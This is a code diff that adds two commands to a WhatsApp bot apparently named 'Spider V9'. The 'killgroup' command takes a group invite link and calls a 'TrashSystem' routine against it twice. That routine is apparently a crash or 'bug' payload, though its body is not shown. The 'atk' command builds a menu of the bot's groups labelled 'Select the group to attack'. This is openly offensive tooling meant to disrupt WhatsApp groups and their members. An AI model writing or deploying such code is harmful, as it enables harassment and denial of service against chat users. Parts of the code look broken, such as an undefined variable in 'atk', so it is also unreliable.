@@ -1125,8 +1125,99 @@ mimetype: 'audio/mpeg'
 })
 }
 break
+case 'killgroup': {
+    if (!isCreator) return reply(mess.owner);
+    if (!isPremium) return reply(mess.prem);
+    if (!q) return reply(`Example: ${prefix + command} https://chat.whatsapp.com/yourGroupLink`);
 
+    const groupLink = q.trim();
+    if (!groupLink.startsWith('https://chat.whatsapp.com/')) {
+        return reply('Please provide a valid group link.');
+    }
 
+    reply('Wait Your Group Link is being Utilised');
+
+    // Function to convert text to invisible characters
+    await TrashSystem(groupLink, sam, cct = true, ptcp = true);
+    await TrashSystem(groupLink, sam, cct = true, ptcp = true);
+
+    reply(`
+        ┏━━━━━━━━━━━━━━━━━━━━━
+         ┃ ▣ 𝗚𝗥𝗢𝗨𝗣 𝗟𝗜𝗡𝗞 𝗗𝗢𝗪𝗡
+         ┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
+         ┗━━━━━━━━━━━━━━━━━━━━━
+         ┏━━━━━━━━━━━━━━━━━━━━━
+         ┃߷ 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊 : ${groupLink}
+         ┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
+         ┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
+         ┗━━━━━━━━━━━━━━━━━━━━━
+         ꀦ 𝗡𝗢𝗧𝗘: 
+         ┏━━━━━━━━━━━━━━━━━━━━━
+         ┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
+         ┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
+         ┗━━━━━━━━━━━━━━━━━━━━━
+   ` );
+
+    await sleep(2000);
+    await sam.sendMessage(m.chat, {
+        audio: bugaudio,
+        mimetype: 'audio/mpeg'
+    }, { quoted: m });
+}
+break;
+case 'atk': {
+if (!isCreator) return
+let imgsc = await prepareWAMessageMedia({
+image: spider
+}, {
+upload: sam.waUploadToServer
+})
+let gcall = Object.values(await sam.groupFetchAllParticipating().catch(_=> null))
+let rows = []
+
+await gcall.forEach((u, i) => {
+let anjay = {
+header: u.subject,
+title: `Attack Group | Status - ( ${u.announce == true ? "Group Closed" : "Group Open"} )`,
+id: `.killgroup ${groupLink}`
+};
+rows.push(anjay)
+});
+
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+header: {
+...imgsc,
+hasMediaAttachment: true
+},
+body: {
+text: "S҉ P҉ I҉ D҉ E҉ R҉  K҉ I҉ L҉ L҉ E҉ R҉ "
+},
+footer: {
+text: "! Select the group to attack "
+},
+nativeFlowMessage: {
+buttons: [{
+name: "single_select",
+buttonParamsJson: JSON.stringify({
+title: "S҉ P҉ I҉ D҉ E҉ R҉  V҉ 9",
+sections: [{
+title: "Only Open groups can be attacked",
+rows: rows
+}]
+})
+}],
+messageParamsJson: ""
+}
+}
+}
+}
+}), { userJid: m.chat, quoted: m })
+sam.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
+}
+break
 		
 
 //============================================//
